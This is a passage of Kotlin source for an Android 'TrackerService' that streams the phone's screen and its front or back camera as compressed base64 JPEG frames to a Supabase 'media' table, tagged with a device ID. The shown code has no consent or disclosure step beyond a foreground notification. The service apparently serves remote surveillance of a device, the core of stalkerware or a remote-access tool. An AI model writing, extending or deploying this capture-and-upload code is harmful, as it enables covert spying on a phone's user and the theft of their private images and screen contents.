        // Android 14 prevents calling createVirtualDisplay twice on the same projection.
        // We keep it alive and just stop reading images.
        Log.d("TrackerService", "Live screen stream stopped (Projection remains active).")
    }
    
    private fun uploadScreenFrame(b64Image: String) {
        if (isUploadingScreen) return // Drop frame to maintain realtime latency if network is lagging
        isUploadingScreen = true
        
        val json = JSONObject().apply {
            put("device_id", deviceName)
            put("type", "screen")
            put("data_b64", b64Image)
        }

        val requestBody = json.toString().toRequestBody("application/json; charset=utf-8".toMediaType())
        val request = Request.Builder()
            .url("$supabaseUrl/rest/v1/media")
            .post(requestBody)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                isUploadingScreen = false
            }

            override fun onResponse(call: Call, response: Response) {
                isUploadingScreen = false
                response.close()
            }
        })
    }

    private fun startLiveCameraStream(facingStr: String) {
        if (isLiveStreamingCamera) stopLiveCameraStream()

        isLiveStreamingCamera = true
        updateForegroundNotification()

        val selector = if (facingStr == "front") CameraSelector.DEFAULT_FRONT_CAMERA else CameraSelector.DEFAULT_BACK_CAMERA
        val cameraProviderFuture = ProcessCameraProvider.getInstance(this)

        cameraProviderFuture.addListener({
            try {
                cameraProvider = cameraProviderFuture.get()
                
                // Set up ImageAnalysis
                imageAnalysis = ImageAnalysis.Builder()
                    .setBackpressureStrategy(ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST)
                    .setOutputImageFormat(ImageAnalysis.OUTPUT_IMAGE_FORMAT_RGBA_8888)
                    .build()

                imageAnalysis?.setAnalyzer(ContextCompat.getMainExecutor(this)) { imageProxy ->
                    processCameraImage(imageProxy)
                }

                // TrackerService is now a LifecycleOwner
                camera = cameraProvider?.bindToLifecycle(this, selector, imageAnalysis)
                
                isLiveStreamingCamera = true
                Log.d("TrackerService", "Live camera stream ($facingStr) started.")
            } catch (e: Exception) {
                Log.e("TrackerService", "Failed to start camera", e)
            }
        }, ContextCompat.getMainExecutor(this))
    }

    private fun stopLiveCameraStream() {
        isLiveStreamingCamera = false
        cameraProvider?.unbindAll()
        cameraProvider = null
        imageAnalysis = null
        camera = null
        Log.d("TrackerService", "Live camera stream stopped.")
    }

    private fun processCameraImage(image: ImageProxy) {
        if (!isLiveStreamingCamera || isUploadingCamera) {
            image.close()
            return
        }

        try {
            val bitmap = image.toBitmap()
            // Resize for upload (similar to screen capture)
            val scaled = Bitmap.createScaledBitmap(bitmap, 480, (480f * bitmap.height / bitmap.width).toInt(), true)
            
            val stream = ByteArrayOutputStream()
            scaled.compress(Bitmap.CompressFormat.JPEG, 40, stream)
            val b64 = Base64.encodeToString(stream.toByteArray(), Base64.NO_WRAP)
            
            uploadCameraFrame("data:image/jpeg;base64,$b64")
        } catch (e: Exception) {
            Log.e("TrackerService", "Error processing camera image", e)
        } finally {
            image.close()
        }
    }

    private fun uploadCameraFrame(b64Image: String) {
        if (isUploadingCamera) return
        isUploadingCamera = true

        val json = JSONObject().apply {
            put("device_id", deviceName)
            put("type", "camera")
            put("data_b64", b64Image)
        }

        val requestBody = json.toString().toRequestBody("application/json; charset=utf-8".toMediaType())
        val request = Request.Builder()
            .url("$supabaseUrl/rest/v1/media")
            .post(requestBody)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                isUploadingCamera = false
            }

            override fun onResponse(call: Call, response: Response) {
                isUploadingCamera = false
                response.close()
            }
        })
    }
}
